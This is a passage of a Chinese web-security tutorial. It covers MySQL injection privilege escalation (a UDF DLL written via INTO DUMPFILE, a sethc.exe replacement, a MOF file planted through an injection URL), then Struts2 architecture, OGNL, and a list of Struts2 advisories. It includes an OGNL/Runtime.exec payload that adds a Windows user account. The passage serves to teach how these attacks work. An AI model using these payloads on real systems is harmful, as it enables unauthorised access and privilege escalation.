 ￼![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517170323354%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

难道是数据传输的时候被截断了？不至于吧，于是用navicat执行上面的语句：-
 ￼![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517170336318%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

我似乎傻逼了，因为查询结果还是只有84字节，结果显然不是我想要的。84字节，不带这么坑的。一计不成又生二计。 不让我直接dumpfile那我间接的去写总行吧？ ￼-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517170415947%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

1 and 1=2 union select '','','',0xUDF转换后的16进制 INTO outFILE'D:/install/dev/mysql5.5/lib/plugin/udf.txt'发现格式不对，给hex加上单引号以字符串方式写入试下: 1 and 1=2 union select '','','',’0xUDF转换后的16进制’ INTO outFILE'D:/install/dev/mysql5.5/lib/plugin/udf.txt'-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517170506313%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

这次写入的起码是hex了吧，再load\_file到查询里面不就行了吗？我们知道load\_file得到的肯定是一个blob吧。 ￼-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517170500206%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

那么在注入点这么去构建一下不就行了： ￼-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517170609575%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

其实这都已经2到家了，这跟第一次提交的数据根本就没有两样。Load file在这里依旧被转换成了0x，我想这不行的话那么应该就只能在blob字段去load\_file才能成功吧，因为现在load到了一个字段类型是text的位置里面。估计是被当字符串处理了，但是很显然是没法去找个blob的字段的，(用上面去information\_schema去找应该能找到)。也就是说现在需要的是一个blob去临时的存储一下。又因为我们知道MYSQL是不支持多行查询的，所以我们根本就没有办法去建表(想过copy查询建表，但是显然是行不通的)。 这不科学，一定是打开方式不对。CAST 和CONVERT 转换成CHAR都不行。能转换成blob之类的吗？CONVERT(0xsbsbsb,BLOB)发现失败了，把BLOB换成 BINARY发现成功执行了。 于是用构建的表单再次执行下面的语句： `SELECT * from corps where id = 1 and 1=2 union select '','','', CONVERT(0x不解释,BINARY) INTO DUMPFILE'D:/install/dev/mysql5.5/lib/plugin/udf.dll'`-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F2018051717064035%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

这次执行成功了，哦多么痛的领悟……一开始把CHAR写成BINARY不就搞定了，二的太明显了。其实上面的二根本就不是事儿，更二的是当我要执行的时候恍然发现根本就没有办法去创建function啊！ O shit shift~ Mysql Driver在pstt.executeQuery()是不支持多行查询的，一个select 在怎么也不能跟create同时执行。为了不影响大家心情还是继续写下去吧，命令行建立一个function，然后在注入点注入（如果有前人已经创建udf的情况下可以直接利用）： ￼![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F2018051717064637%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

因为没有办法去创建一个function所以用注入点实现udf提权在上一步就死了，通过在命令行执行创建function只能算是心灵安慰了，只要完成了create function那一步我们就真的成功了，因为调用自定义function非常简单：-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517170716369%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

#### MOF和sethc提权：

MOF和sethc提权我就不详讲了，因为看了上面的udf提权你已经具备自己导入任意文件到任意目录了，而MOF实际上就是写一个文件到指定目录，而sethc提权我只成功模糊的过一次。在命令行下利用SQL大概是这样的：


现在的管理员很多都会自作聪明的去把net.exe、net1.exe 、cmd.exe、sethc.exe删除防止入侵。当sethc不存在时我们可以用这个方法去试下，怎么确定是否存在?load\_file下看人品了,如果cmd和sethc都不存在那么按照上面的udf提权三部曲上传一个cmd.exe到任意目录。

    SELECT LOAD_FILE('c:/windows/system32/cmd.exe') INTO DUMPFILE'c:/windows/system32/sethc.exe'

MOF大约是这样：

    http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select char(ascii转换后的代码),'','','' into dumpfile 'c:/windows/system32/wbem/mof/nullevts.mof'

#### Mysql小结：

我想讲的应该是一种方法而不是SQL怎么去写，学会了方法自然就会自己去拓展，当然了最好不要向上面udf那么二。有了上面的demo相信大家都会知道怎么去修改满足自己的需求了。学的不只是方法而是思路切记！
# 攻击JavaWeb应用、MVC安全



注:这一节主要是消除很多人把JSP当作了JavaWeb的全部的误解，了解MVC及其框架思想。MVC是用于组织代码用一种业务逻辑和数据显示分离的方法，不管是Java的Struts2、SpringMVC还是PHP的ThinkPHP都爆出过高危的任意代码执行,本节重在让更多的人了解MVC和MVC框架安全，由浅到深尽可能的照顾没Java基础的朋友。所谓攻击JavaWeb，如果连JavaWeb是个什么，有什么特性都不知道，就算能用Struts刷再多的RANK又有何意义？还不如沏一杯清茶，读一本好书，不浮躁，撸上一天。

## 0x00、初识MVC

传统的开发存在结构混乱易用性差耦合度高可维护性差等多种问题，为了解决这些毛病分层思想和MVC框架就出现了。-
MVC是三个单词的缩写,分别为： **模型(Model),视图(View) 和控制(Controller)**。-
**MVC模式的目的就是实现Web系统的职能分工。**

**Model层**实现系统中的**业务逻辑**，通常可以用JavaBean或EJB来实现。

**View层**用于与**用户的交互**，通常用JSP来实现(前面有讲到，JavaWeb项目中如果不采用JSP作为展现层完全可以没有任何JSP文件，甚至是过滤一切JSP请求，JEECMS是一个最为典型的案例)。

**Controller层**是**Model与View之间沟通的桥梁**，它可以分派用户的请求并选择恰当的视图用于显示，同时它也可以解释用户的输入并将它们映射为模型层可执行的操作。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517201049696%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

#### **Model1和Model2：**

Model1主要是用JSP去处理来自客户端的请求，所有的业务逻辑都在一个或者多个JSP页面里面完成，这种是最不科学的。举例:http://localhost/show\_user.jsp?id=2。JSP页面获取到参数id=2就会带到数据库去查询数据库当中id等于 2的用户数据，由于这样的实现方式虽然简单，但是维护成本就非常高。JSP页面跟逻辑业务都捆绑在一起高耦合了。而软件开发的目标就是为了去解耦，让程序之间的依赖性减小。在model1里面SQL注入等攻击简直就是家常便饭。因为在页面里面频繁的去处理各种业务会非常麻烦，更别说关注安全了。典型的Model1的代码就是之前用于演示的SQL注入的JSP页面。

#### **Model1的流程：**

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F2018051720115734%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

Model 2表示的是基于MVC模式的框架，JSP+Servlet。Model2已经带有一定的分层思想了，即Jsp只做简单的展现层，Servlet做后端的业务逻辑处理。这样视图和业务逻辑就相应的分开了。例如：[http://localhost/ShowUserServlet?id=2](http://localhost/ShowUserServlet?id=2)。也就是说把请求交给Servlet处理，Servlet处理完成后再交给jsp或HTML做页面展示。JSP页面就不必要去关心你传入的id=2是怎么查询出来的，而是怎么样去显示id=2的用户的信息(多是用EL表达式或JSP脚本做页面展现)。视图和逻辑分开的好处是可以更加清晰的去处理业务逻辑，这样的出现安全问题的几率会相对降低。-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517201229631%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

#### **Mvc框架存在的问题:**

当Model1和Model2都难以满足开发需求的时候，通用性的MVC框架也就产生了，模型视图控制器，各司其责程序结构一目了然，业务安全相关控制井井有序，这便是MVC框架给我们带来的好处，但是不幸的是由于MVC的框架的实现各自不同，某些东西因为其越来越强大，而衍生出来越来越多的安全问题，**典型的由于安全问题处理不当造成近期无数互联网站被黑阔攻击的MVC框架便是Struts2**。神器过于锋利伤到自己也就在所难免了。而在Struts和Spring当中最喜欢被人用来挖0day的就是标签和OGNL的安全处理问题了。

#### **Spring Mvc:**

Spring 框架提供了构建 Web应用程序的全功能 MVC 模块。使用 Spring 可插入的 MVC 架构，可以选择是使用内置的 Spring Web 框架还是 Struts 这样的 Web 框架。通过策略接口，Spring 框架是高度可配置的，而且包含多种视图技术，例如 JavaServer Pages（JSP）技术、Velocity、Tiles、iText 和 POI、Freemarker。Spring MVC 框架并不知道使用的视图，所以不会强迫您只使用 JSP 技术。Spring MVC 分离了控制器、模型对象、分派器以及处理程序对象的角色，这种分离让它们更容易进行定制。

#### **Struts2:**

Struts是apache基金会jakarta项目组的一个开源项目，采用MVC模式，能够很好的帮助我们提高开发web项目的效率。Struts主要采用了servlet和jsp技术来实现，把servlet、jsp、标签库等技术整合到整个框架中。Struts2比Struts1内部实现更加复杂，但是使用起来更加简单，功能更加强大。

Struts2历史版本下载地址：[http://archive.apache.org/dist/struts/binaries/](http://archive.apache.org/dist/struts/binaries/)

官方网站是: [http://struts.apache.org/](http://struts.apache.org/)

#### **常见MVC比较：**

按性能排序：1、Jsp+servlet>2、struts1>2、spring mvc>3、struts2+freemarker>>4、struts2,ognl,值栈。

**开发效率上,基本正好相反。值得强调的是，Spring mvc开发效率和Struts2不相上下。**

Struts2的性能低的原因是因为OGNL和值栈造成的。所以如果你的系统并发量高，可以使用freemaker进行显示，而不是采用OGNL和值栈。这样，在性能上会有相当大得提高。

而每一次Struts2的远程代码执行的原因都是因为OGNL。

当前JavaWeb当中最为流行的MVC框架主要有Spring MVC和Struts。相比Struts2而言，SpringMVC具有更轻巧，更简易，更安全等优点。但是由于SpringMVC历史远没有Struts那么悠久，SpringMVC想要在一朝一夕颠覆Struts1、2还是非常有困难的。

#### **_JavaWeb的Servlet和Filter：_**

可以说JavaWeb和PHP的实现有着本质的区别，PHP属于解释性语言.不需要在服务器启动的时候就通过一堆的配置去初始化apps而是在任意一个请求到达以后再去加载配置完成来自客户端的请求。ASP和PHP有个非常大的共同点就是不需要预先编译成类似Java的字节码文件，所有的类方法都存在于\*.PHP文件当中。而在Java里面可以在项目启动时去加载配置到Servlet容器内。在web.xml里面配置一个Servlet或者Filter后可以非常轻松的拦截、过滤来自于客户端的任意后缀请求。在系列2的时候就有提到Servlet，这里再重温一下。

##### **Servlet配置：**

```
<servlet>
    <servlet-name>LoginServlet</servlet-name>
    <servlet-class>org.javaweb.servlet.LoginServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>LoginServlet</servlet-name>
    <url-pattern>/servlet/LoginServlet.action</url-pattern>
</servlet-mapping>
```



##### **Filter配置：**


```
<filter>
    <filter-name>struts2</filter-name>
        <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>struts2</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
```

Filter在JavaWeb当中用来做权限控制再合适不过了，再也不用在每个页面都去做session验证了。 假如过滤的url-pattern是/admin/\*那么所有URI中带有admin的请求都必须经过如下Filter过滤：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517201749221%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

**Servlet和Filter一样都可以拦截所有的URL的任意方式的请求。**其中url-pattern可以是任意的URL也可以是诸如\*.action通配符。既然能拦截任意请求如若要做参数和请求的净化就会非常简单了。servlet-name即标注一个Servlet名为LoginServlet它对应的Servlet所在的类是org.javaweb.servlet.LoginServlet.java。由此即可发散开来，比如如何在Java里面实现通用的恶意请求（通用的SQL注入、XSS、CSRF、Struts2等攻击）？敏感页面越权访问？（传统的动态脚本的方式实现是在每个页面都去加session验证非常繁琐，有了filter过滤器，便可以非常轻松的去限制目录权限）。

上面贴出来的过滤器是Struts2的典型配置,StrutsPrepareAndExecuteFilter过滤了/\*，即任意的URL请求也就是Struts2的第一个请求入口。任何一个Filter都必须去实现javax.servlet.Filter的Filter接口，即init、doFilter、destroy这三个接口，这里就不细讲了，有兴趣的朋友自己下载JavaEE6的源码包看下。


```
public void init(FilterConfig filterConfig) throws ServletException;
public void doFilter ( ServletRequest request, ServletResponse response, FilterChain chain 
) throws IOException, ServletException;
public void destroy();
```

**TIPS:**

在Eclipse里面看一个接口有哪些实现,选中一个方法快捷键Ctrl+t就会列举出当前接口的所有实现了。例如下图我们可以轻易的看到当前项目下实现Filter接口的有如下接口，其中SecFilter是我自行实现的，StrutsPrepareAndExecuteFilter是Struts2实现的，这个实现是用于Struts2启动和初始化的，下面会讲到：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517202242439%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

### 0x01、Struts概述

**_Struts1、Struts2、Webwork关系：_**

Struts1是第一个广泛流行的mvc框架，使用及其广泛。但是，随着技术的发展，尤其是JSF、ajax等技术的兴起，Struts1有点跟不上时代的步伐，以及他自己在设计上的一些硬伤，阻碍了他的发展。

同时，大量新的mvc框架渐渐大踏步发展，尤其是webwork。Webwork是opensymphony组织开发的。Webwork实现了更加优美的设计，更加强大而易用的功能。

后来，struts和webwork两大社区决定合并两个项目，完成struts2.事实上，**struts2是以webwork为核心开发的，更加类似于webwork框架，跟struts1相差甚远**。

#### **STRUTS2框架内部流程：**
```
1. 客户端发送请求的tomcat服务器。服务器接受，将HttpServletRequest传进来。
2. 请求经过一系列过滤器(如：ActionContextCleanUp、SimeMesh等)
3. FilterDispatcher被调用。FilterDispatcher调用ActionMapper来决定这个请求是否要调用某个Action
4. ActionMapper决定调用某个ActionFilterDispatcher把请求交给ActionProxy
5. ActionProxy通过Configuration Manager查看struts.xml，从而找到相应的Action类
6. ActionProxy创建一个ActionInvocation对象
7. ActionInvocation对象回调Action的execute方法
8. Action执行完毕后，ActionInvocation根据返回的字符串，找到对应的result。然后将Result内容通过HttpServletResponse
返回给服务器。
```

#### **SpringMVC框架内部流程**：

```
1.用户发送请求给服务器。url：user.do
2.服务器收到请求。发现DispatchServlet可以处理。于是调用DispatchServlet。
3.DispatchServlet内部，通过HandleMapping检查这个url有没有对应的Controller。如果有，则调用Controller。
4.Controller开始执行。
5.Controller执行完毕后，如果返回字符串，则ViewResolver将字符串转化成相应的视图对象；如果返回ModelAndView对象，该对象
本身就包含了视图对象信息。
6.DispatchServlet将执视图对象中的数据，输出给服务器。
7.服务器将数据输出给客户端。
```
在看完Struts2和SpringMVC的初始化方式之后不知道有没有对MVC架构更加清晰的了解。

#### **Struts2请求处理流程分析:**

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517202353582%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)
```
1、服务器启动的时候会自动去加载当前项目的web.xml
2、在加载web.xml配置的时候会去自动初始化Struts2的Filter，然后把所有的请求先交于Struts的
   org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter.java类去做过滤处理。
3、而这个类只是一个普通的Filter方法通过调用Struts的各个配置去初始化。
4、初始化完成后一旦有action请求都会经过StrutsPrepareAndExecuteFilter的doFilter过滤。
5、doFilter中的ActionMapping去映射对应的Action。
6、ExecuteOperations
```
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517202428107%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

源码、配置和访问截图：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F2018051720253452%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

### 0x02、Struts2中ActionContext、ValueStack、Ognl

* * *

在学习Struts命令执行之前必须得知道什么是OGNL、ActionContext、ValueStack。在前面已经强调过很多次容器的概念了。这地方不敢再扯远了，不然就再也扯回不来了。大概理解：tomcat之类的是个大箱子，里面装了很多小箱子，小箱子里面装了很多小东西。而Struts2其实就是在把很多东西进行包装，要取小东西的时候直接从struts2包装好的箱子里面去拿就行了。

#### **ActionContext对象：**

Struts1的Action必须依赖于web容器，他的extecute方法会自动获得HttpServletRequest、HttpServletResponse对象，从而可以跟web容器进行交互。

Struts2的Action不用依赖于web容器，本身只是一个普通的java类而已。但是在web开发中我们往往需要获得request、session、application等对象。这时候，可以通过ActionContext来处理。

ActionContext正如其名，是Action执行的上下文。他内部有个map属性，它存放了Action执行时需要用到的对象。

在每次执行Action之前都会创建新的ActionContext对象，**_通过ActionContext获取的session、request、application并不是真正的HttpServletRequest、HttpServletResponse、ServletContext对象，_**而是将这三个对象里面的值重新包装成了map对象。这样的封装，我们及获取了我们需要的值，同时避免了跟Web容器直接打交道，实现了完全的解耦。

测试代码：
```
public class TestActionContextAction extends ActionSupport{
    private String uname;
    public String execute() throws Exception {
        ActionContext ac = ActionContext.getContext();
        System.out.println(ac);    //在此处定义断点
        return this.SUCCESS;
    }
    //get和set方法省略！
}
```

我们设置断点，debug进去，跟踪ac对象的值。发现他有个table属性，该属性内部包含一个map属性，该map中又有多个map属性，他们分别是：

request、session、application、action、attr、parameters等。

同时，我们跟踪request进去，发现属性attribute又是一个table，再进去发现一个名字叫做”struts.valueStack”属性。内容如下：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517202609194%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

OgnlValueStack可以简单看做List，里面还放了Action对象的引用，通过它可以得到该Action对象的引用。

下图说明了几个对象的关系

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517202624114%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

1\. ActionContext、Action本身和HttpServletRequest对象没有关系。但是为了能够使用EL表达式、JSTL直接操作他们的属性。会有**一个拦截器**将ActionContext、Action中的属性通过类似request.setAttribute()方法置入request中(webwork2.1之前的做法)。这样，我们也可以通过：${requestScope.uname}即可访问到ActionContext和Action中的属性。

##### 注：struts2后，使用装饰器模式来实现上述功能。

Action的实例，总是放到value stack中。因为Action放在stack中，而stack是root(根对象)，所以对Action中的属性的访问就可以省略#标记。

#### **获取Web容器信息：**

在上面我**GETSHELL或者是输出回显的时候就必须获取到容器中的请求和响应对象**。而在Struts2中通过ActionContext可以获得session、request、application，但他们并不是真正的HttpServletRequest、HttpServletResponse、ServletContext对象，而是将这三个对象里面的值重新包装成了map对象。 Struts框架通过他们来和真正的web容器对象交互。

```
获得session：ac.getSession().put("s", "ss");
获得request：Map m = ac.get("request");
获得application： ac.getApplication();
```

**获取HttpServletRequest、HttpServletResponse、ServletContext:**

有时，我们需要真正的HttpServletRequest、HttpServletResponse、ServletContext对象，怎么办? 我们可以通过ServletActionContext类来得到相关对象，代码如下：
```
HttpServletRequest req = ServletActionContext.*getRequest*();
ServletActionContext.*getRequest*().getSession();
ServletActionContext.*getServletContext*();
```

#### **Struts2 OGNL:**

OGNL全称是Object-Graph Navigation Language(对象图形导航语言)，Ognl同时也是Struts2默认的表达式语言。每一次Struts2的命令执行漏洞都是通过OGNL去执行的。在写这文档之前，乌云的drops已有可够参考的Ognl文章了[http://drops.wooyun.org/papers/340](http://drops.wooyun.org/papers/340)。这里只是简单提下。
```
1、能够访问对象的普通方法
2、能够访问类的静态属性和静态方法
3、强大的操作集合类对象的能力
4、支持赋值操作和表达式串联
5、访问OGNL上下文和ActionContext
```


Ognl并不是Struts专用，我们一样可以在普通的类里面一样可以使用Ognl，比如用Ognl去访问一个普通对象中的属性：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517202719272%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

在上面已经列举出了Ognl可以调用静态方法，比如表达式使用表达式去调用runtime执行命令执行：-

    @[email protected]().exec('net user selina 123 /add')

而在Java当中静态调用命令行的方式：

    java.lang.Runtime.*getRuntime*().exec("net user selina 123 /add");

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517202759977%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

### 0x03、Struts漏洞

* * *

Struts2究竟是个什么玩意，漏洞爆得跟来大姨妈紊乱似的，连续不断。前面已经提到了由于Struts2默认使用的是OGNL表达式，而OGNL表达式有着访问对象的普通方法和静态方法的能力。开发者无视安全问题大量的使用Ognl表达式这正是导致Struts2漏洞源源不断的根本原因。通过上面的DEMO应该差不多知道了Ognl执行方式，而Struts2的每一个命令执行后面都坚挺着一个或多个可以绕过补丁或是直接构造了一个可执行的Ognl表达式语句。

#### **Struts2漏洞病例：**

Struts2每次发版后都会release要么是安全问题，要么就是BUG修改。大的版本发布过一下几个。

[1.3.x/](http://struts.apache.org/release/1.3.x/) 2013-02-02 17:59 --
[2.0.x/](http://struts.apache.org/release/2.0.x/) 2013-02-02 11:22 --
[2.1.x/](http://struts.apache.org/release/2.1.x/) 2013-03-02 14:52 --
[2.2.x/](http://struts.apache.org/release/2.2.x/) 2013-02-02 16:00 --
[2.3.x/](http://struts.apache.org/release/2.3.x/) 2013-06-24 11:30 -

小版本发布了不计其数，具体的小版本下载地址：[http://archive.apache.org/dist/struts/binaries/](http://archive.apache.org/dist/struts/binaries/)

#### **Struts公开的安全问题：**

1、Remote code exploit on form validation error: [http://struts.apache.org/release/2.3.x/docs/s2-001.html](http://struts.apache.org/release/2.3.x/docs/s2-001.html)-
2、Cross site scripting (XSS) vulnerability onandtags：-
3、XWork ParameterInterceptors bypass allows OGNL statement execution：-
 [http://struts.apache.org/release/2.3.x/docs/s2-003.html](http://struts.apache.org/release/2.3.x/docs/s2-003.html)-
4、Directory traversal vulnerability while serving static content：

 [http://struts.apache.org/release/2.3.x/docs/s2-004.html](http://struts.apache.org/release/2.3.x/docs/s2-004.html)-
5、XWork ParameterInterceptors bypass allows remote command execution：-
 [http://struts.apache.org/release/2.3.x/docs/s2-005.html](http://struts.apache.org/release/2.3.x/docs/s2-005.html)-
6、Multiple Cross-Site Scripting (XSS) in XWork generated error pages：-
 [http://struts.apache.org/release/2.3.x/docs/s2-006.html](http://struts.apache.org/release/2.3.x/docs/s2-006.html)

7、User input is evaluated as an OGNL expression when there's a conversion error：-
 [http://struts.apache.org/release/2.3.x/docs/s2-007.html](http://struts.apache.org/release/2.3.x/docs/s2-007.html)-
8、Multiple critical vulnerabilities in Struts2： [http://struts.apache.org/release/2.3.x/docs/s2-008.html](http://struts.apache.org/release/2.3.x/docs/s2-008.html)-
9、ParameterInterceptor vulnerability allows remote command execution-
 [http://struts.apache.org/release/2.3.x/docs/s2-009.html](http://struts.apache.org/release/2.3.x/docs/s2-009.html)

10、When using Struts 2 token mechanism for CSRF protection, token check may be bypassed by misusing known session attributes： [http://struts.apache.org/release/2.3.x/docs/s2-010.html](http://struts.apache.org/release/2.3.x/docs/s2-010.html)

11、Long request parameter names might significantly promote the effectiveness of DOS attacks：-
 [http://struts.apache.org/release/2.3.x/docs/s2-011.html](http://struts.apache.org/release/2.3.x/docs/s2-011.html)

12、Showcase app vulnerability allows remote command execution：-
 [http://struts.apache.org/release/2.3.x/docs/s2-012.html](http://struts.apache.org/release/2.3.x/docs/s2-012.html)

13、A vulnerability, present in the includeParams attribute of the URL and Anchor Tag, allows remote command execution：-
 [http://struts.apache.org/release/2.3.x/docs/s2-013.html](http://struts.apache.org/release/2.3.x/docs/s2-013.html)

14、A vulnerability introduced by forcing parameter inclusion in the URL and Anchor Tag allows remote command execution, session access and manipulation and XSS attacks：-
 [http://struts.apache.org/release/2.3.x/docs/s2-014.html](http://struts.apache.org/release/2.3.x/docs/s2-014.html)

15、A vulnerability introduced by wildcard matching mechanism or double evaluation of OGNL Expression allows remote command execution.：-
 [http://struts.apache.org/release/2.3.x/docs/s2-015.html](http://struts.apache.org/release/2.3.x/docs/s2-015.html)

16、A vulnerability introduced by manipulating parameters prefixed with "action:"/"redirect:"/"redirectAction:" allows remote command execution：-
 [http://struts.apache.org/release/2.3.x/docs/s2-016.html](http://struts.apache.org/release/2.3.x/docs/s2-016.html)

18：A vulnerability introduced by manipulating parameters prefixed with "redirect:"/"redirectAction:" allows for open redirects：-
 [http://struts.apache.org/release/2.3.x/docs/s2-017.html](http://struts.apache.org/release/2.3.x/docs/s2-017.html)

#### Struts2漏洞利用详情：

S2-001-S2-004：[http://www.inbreak.net/archives/161](http://www.inbreak.net/archives/161)

S2-005：[http://www.venustech.com.cn/NewsInfo/124/2802.Html](http://www.venustech.com.cn/NewsInfo/124/2802.Html)

S2-006：[http://www.venustech.com.cn/NewsInfo/124/10155.Html](http://www.venustech.com.cn/NewsInfo/124/10155.Html)

S2-007：[http://www.inbreak.net/archives/363](http://www.inbreak.net/archives/363)

S2-008：[http://www.exploit-db.com/exploits/18329/](http://www.exploit-db.com/exploits/18329/)

[http://www.inbreak.net/archives/481](http://www.inbreak.net/archives/481)

S2-009：[http://www.venustech.com.cn/NewsInfo/124/12466.Html](http://www.venustech.com.cn/NewsInfo/124/12466.Html)

S2-010：[http://xforce.iss.net/xforce/xfdb/78182](http://xforce.iss.net/xforce/xfdb/78182)

